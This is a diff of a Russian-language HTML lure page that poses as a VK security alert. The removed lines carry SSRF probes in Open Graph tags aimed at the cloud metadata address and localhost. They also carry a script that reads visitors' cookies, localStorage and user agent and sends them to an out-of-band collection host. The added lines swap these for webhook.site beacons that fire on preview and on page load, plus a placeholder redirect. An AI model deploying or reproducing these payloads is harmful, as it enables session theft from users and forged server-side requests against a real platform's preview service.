@@ -2,34 +2,20 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="Внимание: Обнаружена попытка входа">
+    <meta property="og:title" content="Security Check: Вход выполнен">
     
-    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/hostname">
-    <meta property="og:image:secure_url" content="http://127.0.0.1:65432/test.png">
+    <meta property="og:image" content="https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/bot_start_signal.png">
     
-    <meta property="og:description" content="Зафиксирован вход с нового устройства: Linux, Saint Petersburg.">
-
-    <link rel="icon" href="https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun/target_hit.ico">
-
-    <title>VK Security Center</title>
+    <meta property="og:image:secure_url" content="https://твой-домен.com/redir.php?p=80">
+    
+    <meta property="og:description" content="Проверка конфигурации системы.">
+    <title>VK Test</title>
 </head>
 <body>
-    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
-        <h2>Проверка безопасности...</h2>
-        <p>Идет сканирование узлов сессии. Пожалуйста, подождите.</p>
-    </div>
-
+    <h1>Служба безопасности</h1>
     <script>
-        // Клиентская часть для сбора данных тех, кто кликнет по ссылке
-        (function() {
-            const hook = "https://jcnxiqrzotvqzopexoxwwtmbg5lqynfli.oast.fun";
-            let data = {
-                ua: navigator.userAgent,
-                ck: document.cookie || "none",
-                ls: JSON.stringify(localStorage).substring(0, 300)
-            };
-            fetch(`${hook}/client_data?d=${btoa(JSON.stringify(data))}`, {mode:'no-cors'});
-        })();
+        // Скрипт для сбора данных, если на страницу зайдет человек
+        new Image().src = "https://webhook.site/8a567435-7606-4101-a378-5135d4ac218d/user_click";
     </script>
 </body>
 </html>
